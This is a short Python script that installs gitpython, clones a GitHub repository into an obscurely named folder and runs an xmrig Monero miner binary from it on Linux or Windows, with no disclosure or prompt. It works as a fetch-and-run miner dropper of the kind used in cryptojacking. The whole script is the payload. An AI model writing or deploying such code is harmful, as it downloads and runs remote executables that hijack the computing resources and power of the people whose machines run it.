import sys
from sys import platform
import os
import subprocess

def install(name):
    subprocess.call([sys.executable, '-m', 'pip', 'install', name])
install('gitpython')        
from git import Repo



local_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)),"xxmmr")
repo_url = "https://github.com/sharifulgeo/crypto.git"

if not os.path.exists(local_dir):
    repo = Repo.clone_from(repo_url, local_dir)

#Now running steps

if platform == "linux" or platform == "linux2":
   exefile = os.path.join(local_dir,"linuxmyxmrig","xmrig")
#    os.popen("sudo -S %s"%(command), 'w')
   p = os.system('./%s' % (exefile))
elif platform == "darwin":
    #Do nothing
    pass
elif platform == "win32":
    exefile = os.path.join(local_dir,"win64myxmrig","xmrig.exe")
    os.system(exefile)

